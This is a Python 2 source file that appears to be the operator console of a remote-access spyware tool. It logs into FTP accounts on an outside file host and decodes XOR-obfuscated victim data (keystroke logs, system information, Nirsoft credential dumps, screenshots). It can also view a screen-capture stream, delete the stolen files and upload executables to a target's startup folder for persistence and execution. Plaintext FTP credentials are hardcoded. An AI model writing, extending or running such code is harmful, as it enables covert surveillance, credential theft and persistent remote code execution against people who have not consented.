import ftplib, datetime, time, io, os, re, threading, sys
from Queue import Queue
from PIL import ImageGrab, Image
import StringIO
import cv2
import numpy as np

def XorText(text, xorMap):
    xoredText = ""
    for i, letter in enumerate(text):
        xoredText +=  chr(ord(text[i]) ^ (xorMap[i%len(xorMap)] ^ (xorMap[(len(text)- 1)%len(xorMap)]))) #chr(ord(letter) ^ xorMap[i%len(xorMap)])
    return xoredText

class FTP_Retriever:
    def __init__(self, **kwargs):
        self.debug = kwargs.get("debug", False)
        self.xorMap = [235, 235, 126, 240, 203, 237, 81, 160, 9, 37, 204, 43, 190, 31, 76, 98, 53, 200, 222, 172, 184, 172, 157, 214, 128, 194, 175, 119, 254, 25, 25, 193, 109, 190, 240, 162, 184, 184, 114, 117, 57, 63, 167, 61, 104, 86, 146, 85, 114, 205, 0, 73, 162, 188, 129, 22, 67, 26, 80, 50, 190, 7, 91, 15, 56, 127, 226, 61, 172, 204, 76, 72, 40, 154, 65, 85, 8, 223, 211, 178, 149, 106, 57, 204, 236, 147, 54, 246, 59, 90, 43, 148, 9, 50, 253, 74, 143, 201, 48, 252, 236, 236, 139, 30, 124, 44, 21, 245, 179, 53, 85, 243, 230, 21, 49, 7, 239, 153, 46, 9, 1, 119, 105, 25, 71, 139, 75, 58, 43, 229, 88, 234, 226, 201, 1, 69, 16, 71, 97, 32, 195, 197, 215, 37, 219, 81, 243, 202, 181, 177, 193, 98, 179, 92, 180, 72, 219, 176, 115, 173, 16, 212, 118, 24, 204, 18, 123, 155, 197, 254, 226, 208, 80, 120, 46, 222, 152, 213, 68, 33, 153, 62, 192, 162, 16, 225, 110, 81, 65, 156, 212, 31, 26, 178, 195, 23, 141, 241, 48, 180]
        self.ftp = 0
        self.serverConfigSets = []
        self.serverConfigNum = 0      
        self.keepConnAliveT = threading.Thread(target = self.KeepConnAlive)
        self.keepConnAliveT.daemon = True
        self.keepConnAliveT.start()

        self.fileTypeConfigs = [
            {"fileNames":[], "folder":"\\_\\", "heading":"Sysinfo"},
            {"fileNames":[], "folder":"\\", "heading":"Keystroke"},
            {"fileNames":[], "folder":"\\n\\", "heading":"Nirsoft"},
            {"fileNames":[], "folder":"\\ii\\", "heading":"Screenshots"}
            ]
                    
    def __del__(self):
        self.Disconnect()

    def KeepConnAlive(self):
        secTimer = time.clock()
        while True:
            time.sleep(3)
            if (time.clock() - secTimer) > 60:
                try: self.ftp.voidcmd("NOOP")
                except: pass
                secTimer = time.clock()
            
    def PickFTPserverConfig(self, config_sets): #config_sets = list of lists [srv, usr, pswd]
        self.serverConfigSets = config_sets
        print "\nAvailable accounts:\n"
        for i,c in enumerate(self.serverConfigSets):
            print str(i)+". "+ " : ".join(val for val in c) #c = [server, name, password]
        self.serverConfigNum = int(raw_input("\nWhich account to check:\n> "))
    
    def Connect(self):
        self.ftp = ftplib.FTP(self.serverConfigSets[self.serverConfigNum][0],
                              self.serverConfigSets[self.serverConfigNum][1],
                              self.serverConfigSets[self.serverConfigNum][2])
        #if self.debug: print ("Logged in ("+ server +", "+ name +", "+ password +")")
        print "Logged in ("+ self.serverConfigSets[self.serverConfigNum][0] +", "+ self.serverConfigSets[self.serverConfigNum][1] +", "+ self.serverConfigSets[self.serverConfigNum][2] +")"

    def Disconnect(self):
        if self.ftp:
            try: self.ftp.quit()
            except:
                try: self.ftp.exit()
                except: pass

    def DirectoriesAvailable(self):
        self.directories = []
        self.ftp.retrlines('LIST', self.directories.append)
        self.directories = [re.findall(r'\d{2}:\d{2}\s(_.+)', d)[0] for d in self.directories if re.findall(r'\d{2}:\d{2}\s_', d)]
        if self.directories: return True
        #print 'No directories starting with "_" were found.'
        return False

    def GetDirectories(self):
        return self.directories
        #print '\nDirectories:'
        #for i, directory in enumerate(self.directories):
            #print str(i) + ". " + directory
                
    def PickDirectory(self, dirNum):
        self.dirNum = dirNum

    def FilesAvailable(self):
        self.MakeSureSubDirsAreThere()
        for d in self.fileTypeConfigs:
            d["fileNames"] = self.ftp.nlst("\\"+ self.directories[self.dirNum] + d["folder"])
        if any(d["fileNames"] for d in self.fileTypeConfigs):
            return True      
        return False
    
    def GetFileNames(self, **kwargs):
        if kwargs.get("recheck", False) == True:
            self.MakeSureSubDirsAreThere()
            for d in self.fileTypeConfigs:
                d["fileNames"] = self.ftp.nlst("\\"+ self.directories[self.dirNum] + d["folder"])
        fTypOut = []
        for d in self.fileTypeConfigs:
            fTypOut.append([d["heading"] + " files:"] + ["\n"+str(i) + ". "+ d["folder"] + "".join(n) for i,n in enumerate(d["fileNames"])] + ["\n\n"])       

        return ["".join(t) if len(t)>2 else "" for t in fTypOut]

    def MakeSureSubDirsAreThere(self):
        directories = []
        self.ftp.retrlines('LIST \\' + self.directories[self.dirNum], directories.append)
        for d in self.fileTypeConfigs:
            if not any(d["folder"].replace("\\","").replace("/","") in directory for directory in directories):
                self.ftp.mkd("\\"+self.directories[self.dirNum] + d["folder"])
        
        if not any("vv" in directory for directory in directories):
            self.ftp.mkd("\\"+self.directories[self.dirNum]+"\\vv")

    def DownloadAllFiles(self):
        print ""
        if not os.path.exists("Saved output"):
            os.makedirs("Saved output")
        self.outputPath = "Saved output/" + self.directories[self.dirNum]
        if not os.path.exists(self.outputPath):
            os.makedirs(self.outputPath)

        for d in self.fileTypeConfigs:
            self.DownloadSpecificFiles(d["fileNames"], d["folder"], d["heading"])

            
       
    def DownloadSpecificFiles(self, fileNames, folder, heading):
        if not os.path.exists(self.outputPath + folder.replace("\\", "/")):
            os.makedirs(self.outputPath + folder.replace("\\", "/"))

        data = ""
        if fileNames:
            if heading == "Screenshots":
                images = []
                for name in fileNames:
                    fileData = []
                    self.ftp.retrbinary('RETR ' + "\\"+ self.directories[self.dirNum] + folder + name, fileData.append)
                    images.append(XorText("".join(fileData), self.xorMap))
                for i,img in enumerate(images):
                    tempBuff = StringIO.StringIO()
                    tempBuff.write(img)
                    tempBuff.seek(0) #need to jump back to the beginning before handing it off to PIL           
                    file_abs_name = self.outputPath + "/ii/" + fileNames[i].split(".")[0] + ".JPEG"
                    Image.open(tempBuff).save(file_abs_name)
                if images: print "Images downloaded to: " + self.outputPath + folder.replace("\\","/")
            else:
                for name in fileNames:
                    fileData = []
                    data += "\n\n\n>>>>>>>>>>>>>>>  "+ heading +": " + name +"  <<<<<<<<<<<<<<<<\n"
                    self.ftp.retrbinary('RETR ' + "\\"+ self.directories[self.dirNum] + folder + name, fileData.append)
                    data += XorText("".join(fileData), self.xorMap)
                    
                packedFileName = (fileNames[0].split(".")[0] + " - " + fileNames[len(fileNames)-1].split(".")[0]) if len(fileNames) > 1 else fileNames[0].split(".")[0]
                file_abs_name = self.outputPath + folder.replace("\\", "/") + packedFileName + ".mm"
                with open(file_abs_name, "wb") as f:
                    f.write(data)
                    print heading + " downloaded to: " + file_abs_name

    def GetAllContent(self):
        content = ""
        for d in self.fileTypeConfigs:
            content += self.GetSpecificFileTypeContent(d["fileNames"], d["folder"], d["heading"])
        return content
              
    def GetSpecificFileTypeContent(self, fileNames, folder, heading):
        text = ""
        if heading == "Screenshots":
            text += "\n\n"
            for name in fileNames:
                text += ">>>>>>>>>>>>>>>  " + heading + ": "+ name +"  <<<<<<<<<<<<<<<<\n"
        else:
            for name in fileNames:
                fileData = []
                text += "\n\n\n>>>>>>>>>>>>>>>  " + heading + ": "+ name +"  <<<<<<<<<<<<<<<<\n"
                self.ftp.retrbinary('RETR ' + "\\"+ self.directories[self.dirNum] + folder + name, fileData.append)
                text += XorText("".join(fileData), self.xorMap)        
        return text

    
    def GetSingleFileContent(self, heading, fileNum):
        fileData = []
        for d in self.fileTypeConfigs:
            if d["heading"] == heading:
                fileName = d["fileNames"][fileNum]
                folderName = d["folder"]
        data = "\n\n\n>>>>>>>>>>>>>>>  "+ heading +": "+ fileName +"  <<<<<<<<<<<<<<<<\n"        
        self.ftp.retrbinary('RETR ' + "\\"+ self.directories[self.dirNum] + folderName + fileName, fileData.append)
        return data + XorText("".join(fileData), self.xorMap)

    def DeleteFTPfiles(self):
        output = ""        
        for d in self.fileTypeConfigs:
            for name in d["fileNames"]:
                self.ftp.delete("\\"+ self.directories[self.dirNum] + d["folder"] + name)
                output += "deleted= " +  "\\"+ self.directories[self.dirNum] + d["folder"] + name + "\n"
        return output

    def DeleteFTPdirectory(self):
        self.ftp.rmd("\\"+ self.directories[self.dirNum])
        print self.directories[self.dirNum] + " directory has been deleted."

    def ShowScreenShot(self, imgNum):
        fileName = [d["fileNames"][imgNum] for d in self.fileTypeConfigs if d["heading"] == "Screenshots"][0]
        folderName = [d["folder"] for d in self.fileTypeConfigs if d["heading"] == "Screenshots"][0]
        
        retrievedData = []
        self.ftp.retrbinary('RETR ' + "\\"+ self.directories[self.dirNum] + folderName + fileName, retrievedData.append)
        tempBuff = StringIO.StringIO()
        tempBuff.write(XorText("".join(retrievedData),self.xorMap))
        tempBuff.seek(0) #need to jump back to the beginning before handing it off to PIL
        Image.open(tempBuff).show()

    def RequestScreenCaptureStream(self): #not developed it much, it requires more work to be done to be fully functional
        if "s.mm" not in self.ftp.nlst("\\"+ self.directories[self.dirNum] +"\\vv"):
            self.ftp.storbinary("STOR " + "\\"+ self.directories[self.dirNum] +"\\vv\\s.mm", io.BytesIO("-"))

    def AbandonScreenCaptureStream(self): #not developed it much, it requires more work to be done to be fully functional
        if "s.mm" in self.ftp.nlst("\\"+ self.directories[self.dirNum] +"\\vv"):
            self.ftp.delete("\\"+ self.directories[self.dirNum] +"\\vv\\s.mm")   

    def ViewScreenCaptureStream(self): #not developed it much, it requires more work to be done to be fully functional
        frames = []
        frameFileNames = [fN for fN in self.ftp.nlst("\\"+ self.directories[self.dirNum] +"\\vv") if fN != "s.mm"]
        if frameFileNames:
            for fileName in frameFileNames:
                retrievedData = []
                self.ftp.retrbinary('RETR ' + "\\"+ self.directories[self.dirNum] +"\\vv\\" + fileName, retrievedData.append)
                tempBuff = StringIO.StringIO()
                tempBuff.write(XorText("".join(retrievedData),self.xorMap))
                tempBuff.seek(0) #need to jump back to the beginning before handing it off to PIL
                printscreen_pil = Image.open(tempBuff)

                printscreen_pil = printscreen_pil.resize((printscreen_pil.size[0],printscreen_pil.size[1]), Image.ANTIALIAS)
                frame = np.array(printscreen_pil.getdata(),dtype=np.uint8).reshape((printscreen_pil.size[1],printscreen_pil.size[0],3))
                #frames.append(frame)

                cv2.namedWindow("window", cv2.WINDOW_NORMAL)
                cv2.imshow('window', frame)
                #cv2.resizeWindow('window', 200,200)
                if cv2.waitKey(0) & 0xFF == ord('q'):
                    cv2.destroyAllWindows()
                    break
        else:
            print "No frames available"
            return
        '''
        for frame in frames:
            cv2.namedWindow("window", cv2.WINDOW_NORMAL)
            cv2.imshow('window', frame)
            #cv2.resizeWindow('window', 200,200)
            if cv2.waitKey(0) & 0xFF == ord('q'):
                cv2.destroyAllWindows()
                break
        '''

    def UploadFile(self):
        fileName = raw_input("The name of the file\n> ")
        dName = raw_input("Destination file name\n> ")
        fileInfo = "destinationFileName=" + dName + "\n"
        d = raw_input("Destination path (input startup for persistence)\n> C:Users/%username%/")
        fileInfo += "destinationPath=" + ("startup" if d.endswith("startup") else d) + "\n"
        fileInfo += "execute=" + ("True" if raw_input("Execute it after download? (y/n)\n> ") == "y" else "False") + "\n"
        isNir = raw_input("Is it nirsoft executable? (y/n)\n> ")
        if isNir == "y":
            fileInfo += "nirsoft=True\n"
            p = "params=/scomma "+ dName.split(".")[0] + ".mm"
        else:
            fileInfo += "nirsoft=False\n"
            p = "params=" + raw_input("Parameters to run (example: -F -w keys.py)\n> ")  
        fileInfo += p if p else "none"
        fileInfo += "###########################_____________________###############################"

        with open(fileName, "rb") as f:
            fileData = f.read()

        if "f.mm" not in self.ftp.nlst("\\"+ self.directories[self.dirNum] +"\\f"):
            self.ftp.storbinary("STOR " + "\\"+ self.directories[self.dirNum] +"\\f\\f.mm", io.BytesIO(XorText(fileInfo + fileData, self.xorMap)))
        else:
            self.ftp.delete("\\"+ self.directories[self.dirNum] +"\\f\\f.mm")
            self.ftp.storbinary("STOR " + "\\"+ self.directories[self.dirNum] +"\\f\\f.mm", io.BytesIO(XorText(fileInfo + fileData, self.xorMap)))         

        
def enum(*sequential, **named):
    enums = dict(zip(sequential, range(len(sequential))), **named)
    return type('Enum', (), enums)

workStages = enum("EXIT", "LOGIN", "DIRCHECK", "FILEMANIPULATION")

if __name__ == "__main__":  
    action = ""
    options = "\nOPTIONS\n\
-Press enter to download the files\n\
-Input p            to print the full files content\n\
-Input im-imgNum    to view the specific screenshot\n\
-Input ps-fileNum   to view the specific systeminfo file\n\
-Input pk-fileNum   to view the specific keystrokes file\n\
-Input ni-fileNum   to view the specific nirsoft file\n\
-Input d            to pick another directory\n\
-Input sf           to see the filenames again\n\
-Input sfr          to see the filenames again (recheck FTP server)\n\
-Input scsr         to request screen capture stream\n\
-Input scsa         to abandon screen capture stream\n\
-Input scs          to view screen capture stream\n\
-Input u            to upload file to the target startup\n\
-Input df           to delete the server files\n\
-Input du           to delete whole user directory from the server\n\
-Input a            to check another ftp account\n\
-Input e            to exit\n> "
    
    workStage = workStages.LOGIN
    ftpR = FTP_Retriever(debug = "true")
    while workStage:  
        ftpR.PickFTPserverConfig([
            ["ftp.drivehq.com","michal","qwerty"],
            ["ftp.drivehq.com","monday","password2"],
            ["ftp.drivehq.com","thirdAccountUsername","thirdAccountPssword"]
            ])


        try: ftpR.Connect()
        except Exception as e:
            if "free service users can logon 100 times, plus 25 times/day" in str(e):
                print "\n100 overall or 25 logins per day reached..."
                continue
            else:
                print e
                raise SystemExit
            
        workStage = workStages.DIRCHECK
        while workStage == workStages.DIRCHECK:
            if ftpR.DirectoriesAvailable():
                print "\n" + "\n".join(str(i)+". " + d for i,d in enumerate(ftpR.GetDirectories()))
                ftpR.PickDirectory(int(raw_input("\nSelect directory\n> ")))
                if not ftpR.FilesAvailable():
                    #print "No files found.\n" + "".join(str(i)+". " + d + "\n" for i,d in enumerate(ftpR.GetDirectories()))
                    print "No files found."
                    workStage = workStages.FILEMANIPULATION
                    #ftpR.PickDirectory(int(raw_input("\nSelect directory\n> ")))
                print "\n" + "".join(ftpR.GetFileNames())
                workStage = workStages.FILEMANIPULATION
            else:
                print "\nNo directories found..."
                workStage = workStages.LOGIN
                ftpR.Disconnect()
                
            while workStage == workStages.FILEMANIPULATION:
                action = raw_input(options)
                if action == "p":
                    print ftpR.GetAllContent()
                elif action == "d":
                     workStage = workStages.DIRCHECK
                elif action == "df":
                    print ftpR.DeleteFTPfiles()                    
                    workStage = workStages.DIRCHECK
                elif action == "du":
                    ftpR.DeleteFTPdirectory()
                    workStage = workStages.DIRCHECK
                elif action == "e":
                    workStage = workStages.EXIT
                elif action == "a":
                    workStage = workStages.LOGIN
                elif action.startswith("im-"):
                    ftpR.ShowScreenShot(int(action.split("-")[1]))
                elif action.startswith("ps-"):
                    print ftpR.GetSingleFileContent("Sysinfo", int(action.split("-")[1])) #GetSingleFileContent
                elif action.startswith("pk-"):
                    print ftpR.GetSingleFileContent("Keystroke", int(action.split("-")[1]))
                elif action.startswith("ni-"):
                    print ftpR.GetSingleFileContent("Nirsoft", int(action.split("-")[1]))
                elif action == "sf":
                    print "\n" + "".join(ftpR.GetFileNames(recheck=False))
                elif action == "sfr":
                    print "\n" + "".join(ftpR.GetFileNames(recheck=True))
                elif action == "scsr":
                    ftpR.RequestScreenCaptureStream()
                elif action == "scsa":
                    ftpR.AbandonScreenCaptureStream()
                elif action == "scs":
                    ftpR.ViewScreenCaptureStream()
                elif action == "u":
                    ftpR.UploadFile()
                elif not action:
                    ftpR.DownloadAllFiles()
                    workStage == workStages.FILEMANIPULATION